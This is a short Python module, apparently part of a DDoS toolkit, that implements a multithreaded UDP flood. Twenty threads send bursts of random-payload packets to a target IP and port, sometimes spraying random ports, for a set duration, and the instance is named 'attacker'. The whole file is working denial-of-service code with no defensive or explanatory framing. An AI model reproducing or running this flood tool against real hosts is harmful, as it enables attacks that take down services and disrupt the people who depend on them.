import socket
import threading
import os
import time
import random

class UDPPPS:
    def __init__(self, ip, port, threads, stop_event=None):
        self.ip = ip
        self.port = port
        self.packet_size = 1024
        self.threads = threads
        self.stop_event = stop_event
        self.on = False

    def flood(self, duration):
        self.on = True
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.send, daemon=True)
            t.start()
            threads.append(t)

        end_time = time.time() + duration
        try:
            while time.time() < end_time and self.on:
                if self.stop_event and self.stop_event.is_set():
                    break
                time.sleep(0.1)
        except KeyboardInterrupt:
            pass
        finally:
            self.on = False

    def send(self):
        while self.on:
            if self.stop_event and self.stop_event.is_set():
                break
            try:
                # Reduce burst y tamaño de paquete
                packet_size = random.choice([512, 1024, 2048])
                data = os.urandom(packet_size)
                dest_port = self.port
                if random.random() > 0.85:
                    dest_port = random.randint(1, 65535)
                burst_count = random.randint(3, 10)
                for _ in range(burst_count):
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.sendto(data, (self.ip, dest_port))
                    s.close()
                # Agrega un pequeño sleep para no saturar la CPU
                time.sleep(0.01)
            except Exception:
                pass

def run(ip, port, duration, stop_event):
    # Baja a 20 threads por defecto
    attacker = UDPPPS(ip, port, threads=20, stop_event=stop_event)
    attacker.flood(duration)
